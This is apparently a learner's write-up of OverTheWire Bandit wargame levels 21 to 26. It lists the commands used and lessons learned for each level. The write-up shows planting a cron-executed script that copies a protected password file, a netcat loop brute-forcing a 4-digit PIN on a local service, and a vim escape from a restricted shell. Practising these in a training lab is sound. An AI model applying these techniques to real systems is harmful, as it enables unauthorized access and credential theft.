# Bandit Levels 21 → 25

## Level 21 → 22

### Challenge
Investigate cron jobs to find the password.

### Commands Used

```bash
ls /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
```

### What I Learned
- Cron jobs automate scheduled tasks in Linux.
- Scripts inside cron jobs may expose useful information.

---

## Level 22 → 23

### Challenge
Find where the cron job stores the password.

### Commands Used

```bash
cat /usr/bin/cronjob_bandit23.sh
```
Generated the filename manually and read the output file.
```
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
```
This generated a dynamic filename and then used it to read the password.

### What I Learned
- Hashing and scripting logic can be analyzed manually.
- md5sum makes a fingerprint (hash) of a text.
---

## Level 23 → 24

### Challenge
Create a script executed automatically by cron.

### Commands Used

```bash
mkdir /tmp/mydir
chmod 777 /tmp/mydir
nano /tmp/mydir/myscript.sh
Paste this inside: 
	#! /bin/bash
	cat /etc/bandit_pass/bandit24 > /tmp/mydir/password
chmod +x /tmp/mydir/mysscript.sh
cp /tmp/mydir/myscript.sh /var/spool/bandit24/foo
sleep 70
cat /tmp/mydir/password
```

### What I Learned
- Cron can execute user-created scripts automatically.

---

## Level 24 → 25

### Challenge
Bruteforce a 4-digit PIN sent with the password.

### Commands Used

```bash
for i in {0000..9999}; do
    echo "password $i"
done | nc localhost 30002 | grep -v Wrong
```

### What I Learned
- Bash loops can automate repetitive tasks.
- Netcat can communicate with services over ports.

---

## Level 25 → 26

### Challenge
SSH login immediately exits because of a custom shell.

### Commands Used

```bash
cat /etc/passwd
more text.txt
v
type in vim:
	set shell=/bin/bash
:shell
```

Used vim escape techniques to access a shell.

### What I Learned
- Linux shells can be customized or restricted.
- Vim can sometimes be used to escape restricted environments.
